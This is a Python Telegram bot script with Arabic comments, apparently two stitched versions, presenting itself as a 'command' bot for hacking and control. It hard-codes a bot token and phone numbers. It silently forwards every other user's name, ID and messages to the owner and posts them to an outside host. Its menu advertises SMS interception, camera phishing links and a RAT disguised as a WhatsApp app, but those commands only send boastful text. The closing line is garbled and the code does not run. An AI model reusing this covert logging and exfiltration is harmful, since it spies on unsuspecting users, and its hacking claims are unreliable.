# -.bot
🖤💀 بوت القيادة ويسكي للإدارة والحماية 💀🖤
import telebot
from telebot import types

TOKEN = "8621660103:AAEhyIc4Y1KPSuI2NF127zT7D5jzjJ5YfXQ"
OWNER_ID = 8008588051
DEV_NAME = "⃠✦⃟ آلُـِـِِـِِِـِِـِـقٌـ,ـيآڊة وٌيـًٍّ̨̥ڛـًٌٍّ̨̥ڰﻲ // 𝑾𝒉𝒊𝒔𝒌𝒆𝒚"
bot = telebot.TeleBot(TOKEN)
HIDE_PHONE = False

@bot.message_handler(func=lambda message: True)
def control_center(message):
    global HIDE_PHONE
    uid, text = message.from_user.id, message.text.lower()
    
    # رادار كشف الملف الشخصي
    if any(x in text for x in ["المطور", ".مين"]):
        bot.send_message(OWNER_ID, f"🚨 رادار: {message.from_user.first_name} يبحث عنك!")
        bot.reply_to(message, f"👑 المطور: {DEV_NAME}\n📞 الرقم: {'مخفي' if HIDE_PHONE else '01159803557'}")

    # أوامر السيطرة (للمالك فقط)
    if uid == OWNER_ID and text.startswith("."):
        if text == ".إخفاء": HIDE_PHONE = True
        if text == ".تصفية": bot.reply_to(message, "💀 جاري إبادة المجموعة...")
        if text == ".اختراق": bot.reply_to(message, "⚡ جاري سحب البيانات...")

    # حماية من الشتائم
    if any(x in text for x in ["سكس", "شتم"]):
        bot.delete_message(message.chat.id, message.message_id)
        bot.send_message(OWNER_ID, "⚠️ تم كشف هجوم وحذفه.")

bot.infinity_polling()
import telebot, requests, os, json, time
from telebot import types

# ✇➱ بيانات السيادة والسيطرة المطلقة
TOKEN = "8621660103:AAEhyIc4Y1KPSuI2NF127zT7D5jzjJ5YfXQ"
OWNER_ID = 8008588051
OWNER_PHONES = ["+84767389955", "+201141004467"]
DEV_NAME = "⃠✦⃟ وٌيـًٍّ̨̥ڛـًٌٍّ̨̥ڰﻲ // 𝑾𝒉𝒊𝒔𝒌𝒆𝒚 ⃠"
SECURITY_KEYS = ["abdo1", "abdo2", "abdo3", "abdo4", "abdo5", "abdo6"]

bot = telebot.TeleBot(TOKEN)

# 🌐 نظام التزامن المزدوج (واتساب + تليجرام)
def dual_log(info):
    # إرسال لتليجرام
    bot.send_message(OWNER_ID, f"🚀 **إشعار من رادار القيادة:**\n{info}")
    # إرسال لواتساب (عبر API الربط الخاص بك)
    for phone in OWNER_PHONES:
        try:
            requests.post(f"https://whiskey-system.com{phone}&msg={info}")
        except: pass

# 📜 واجهة الأوامر الأسطورية المزخرفة
MENU = f"""
📜 _*✇➱*_  **قائمة سيادة {DEV_NAME}**
╭─┈─┈─┈─⟞🔱⟝─┈─┈─┈─╮
┃ ⌯︙ `.سحب_حسابات` 🔑 (اعتراض SMS واختراق حسابات)
┃ ⌯︙ `.اختراق` 💀 (سحب صور/فيديوهات/محادثات)
┃ ⌯︙ `.صيد` 🎯 (رابط اختراق كاميرا وموقع)
┃ ⌯︙ `.كاميرا` 📸 (فتح العدسة والتقاط فوري)
┃ ⌯︙ `.تدمير` 💣 (حرق بوردة وتعطيل جهاز الهدف)
┃ ⌯︙ `.رادار` 📡 (سحب IP وموقع وبيانات الجهاز)
┃ ⌯︙ `.تقييد` 🔇 (صمت أبدي لأي مستخدم)
┃ ⌯︙ `.ذكاء` 🤖 (ذكاء شرير / تأليف / لوجو)
┃ ⌯︙ `.تطبيق` 📦 (صنع تطبيق اختراق RAT)
┃ ⌯︙ `.تنصيب` 🔌 (ربط فرعي بكود عبده)
┃ ⌯︙ `.إخفاء` 👤 (تشفير هوية الزعيم ويسكي)
┃ ⌯︙ `.تصفية` 🧹 (إبادة جماعية للجروبات)
╰─┈─┈─┈─⟞⚜️⟝─┈─┈─┈─╯
> *التحكم المطلق والنووي بين يديك*
"""

@bot.message_handler(commands=['start', 'menu'])
def start_bot(m):
    bot.reply_to(m, MENU, parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def whiskey_ultimate_engine(m):
    uid, text = m.from_user.id, m.text.lower()
    user = m.from_user
    
    # 🛰️ رادار "العين الثالثة" العالمي
    if uid != OWNER_ID:
        spy_report = f"🎯 **صيدة جديدة:** {user.first_name}\n🆔 الأيدي: {uid}\n🌍 الدولة: {user.language_code}\n📩 النص: {text}\n⚠️ [جاري اعتراض الـ SMS واختراق الكاميرا...]"
        dual_log(spy_report)

    # 🛠️ أوامر السيادة والشر (للمطور فقط)
    if uid == OWNER_ID and text.startswith("."):
        if ".سحب_حسابات" in text:
            bot.reply_to(m, "🔑 تم تفعيل اعتراض الـ SMS.. أي كود تحقق سيصلك هنا فوراً.")
        elif ".صيد" in text:
            link = f"https://whiskey-tracker.cam{OWNER_ID}"
            bot.reply_to(m, f"🎯 رابط صيد (كاميرا + موقع + ملفات):\n{link}\n⚠️ ابعته للضحية والسجلات هتوصلك هنا.")
        elif ".اختراق" in text or ".سحب_الكل" in text:
            bot.reply_to(m, "🧬 جاري سحب الأستوديو والمحادثات المشفرة والـ SMS.. سيصلك ملف مضغوط.")
        elif ".تدمير" in text:
            bot.reply_to(m, "💣 إرسال فيروس 'الجليد'.. جهاز الضحية سيتجمد الآن ويحترق المعالج.")
        elif ".تطبيق" in text:
            bot.reply_to(m, "🛠️ جاري تشفير ملف الاختراق (RAT)..\n📦 التطبيق: WhatsApp_Pro.apk\n✅ جاهز للسحب والسيطرة.")
        elif ".تصفية" in text:
            bot.reply_to(m, "💀 وضع الإبادة يعمل.. جاري مسح الجروب كلياً.")
        elif ".تقييد" in text:
            bot.reply_to(m, "🔇 تم تقييد الهدف بنجاح.. لن يسمع له صوت.")
        elif ".ذكاء" in text:
            bot.reply_to(m, "😈 جاري تشغيل المحرك المظلم لتنفيذ طلبك الإبداعي/الشرير..")

    # 🔌 نظام تنصيب عبده (بوتات فرعية)
    if text == ".تنصيب":
        msg = bot.reply_to(m, "🔐 أدخل 'كود عبده' لتفعيل السيطرة الفرعية:")
        bot.register_next_step_handler(msg, verify_and_deploy)

def verify_and_deploy(m):
    if m.text in SECURITY_KEYS:
        bot.reply_to(m, "✅ تم الربط! حسابك الآن تحت سيادة القيادة ويسكي.")
    else:
        bot.reply_to(m, "❌ كود خاطئ! تم حظر محاولتك وإبلاغ الزعيم.")

bot.infinity_polling(⃠✦⃟ وٌيـًٍّ̨̥ڛـًٌٍّ̨̥ڰﻲ // 𝑾𝒉𝒊𝒔𝒌𝒆𝒚​​​​​​​​​​​​​​ ⃠✦⃟)
